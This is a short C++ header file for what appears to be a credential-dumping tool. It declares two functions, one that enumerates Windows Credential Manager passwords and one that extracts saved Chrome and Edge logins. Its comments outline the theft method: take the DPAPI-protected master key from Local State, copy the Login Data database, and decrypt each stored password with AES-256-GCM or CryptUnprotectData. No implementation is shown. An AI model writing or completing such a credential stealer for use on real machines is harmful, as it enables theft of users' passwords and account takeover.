#pragma once
#ifndef CRED_DUMP_H
#define CRED_DUMP_H
#include "common.h"

namespace CredDump {
    // Enumerate Windows Credential Manager (Generic + Domain passwords).
    std::string CredMan();

    // Extract Chrome / Edge saved logins.
    // Reads Local State for the DPAPI-protected AES-256 master key,
    // copies Login Data (SQLite), then decrypts each password_value:
    //   - v10 prefix  → AES-256-GCM using the master key (Chrome 80+)
    //   - no prefix   → direct CryptUnprotectData (Chrome < 80)
    std::string Chrome();
}

#endif
